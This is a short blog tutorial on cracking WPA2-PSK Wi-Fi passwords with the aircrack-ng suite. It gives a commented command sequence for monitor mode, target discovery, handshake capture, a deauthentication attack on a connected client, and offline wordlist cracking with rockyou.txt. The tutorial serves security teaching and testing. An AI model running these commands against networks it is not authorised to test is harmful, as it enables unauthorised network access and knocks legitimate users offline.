---
title: Password Cracking WPA2-PSK Networks
author: Kevin Tarus
date: 2023-06-02 16:51:00 +0300
categories: [Hacks]
tags: [WPA2, wifi, mac address, kali linux, airmon-ng]
---

## What Activities Ethical Hackers perform on Wireless Networks
- Evaluating strength of PSK
- Reviewing nearby networks, rogue devices
- Assessing guest networks
- Checking network access

## Tools used
- Wireless card that supports dual band, monitor mode and packet injection. => [Plug and Play Wireless card](https://amzn.to/3RQ6XCr)
- Router
- Laptop

## Hacking Process
![Hacking Process](/assets/wpa2.png)

```linux commands
iwconfig                        #check the wireless network configurations, check if usb wireless card is working
airmon-ng check kill            #kill processes that may interfere with what we are about to do
airmon-ng start wlan0           #allows wireless card to monitor incoming traffic, where "wlan0" is name of your wireless card
iwconfig                        #confirm whether monitor mode has been enabled

airodump-ng wlan0mon            #finding the wireless network we want to specifically attack

#bssid - mac address of access point
#PWR(power level) - the lower the number the closer we are to the device
#beacons and data - show traffic happening on those bssids

airodump-ng -c 6 --bssid 50:C7:BF:8A:00:73 -w capture wlan0mon     #tries to capture the 3 way handshake
#-c = channel of the device
#-w capture = name of the file where the capture will be stored

#to speed the above process, do the deauth attack
#open another terminal
aireplay-ng -0 1 -a 50:C7:BF:8A:00:73 -c 50:C7:BF:8A:00:74 wlan0mon       #will deauthanticate this device 50:C7:BF:8A:00:74 from the network to capture the 3 way handshake
#-0 = deauth attack
#1 = only one time
#-c = client we want to deauth

aircrack-ng -w wordlist.txt -b 50:C7:BF:8A:00:73 capture.cap              #tries capturing the password by comparing it to a wordlist
#-b = Acess Point mac address

wireshark capture.cap              #monitor captured traffic in wireshark, search for eapol

aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt             #using a popolar wordlist with over 1 million entries
```

This attack will only work when the network uses **WEAK PASSWORDS**
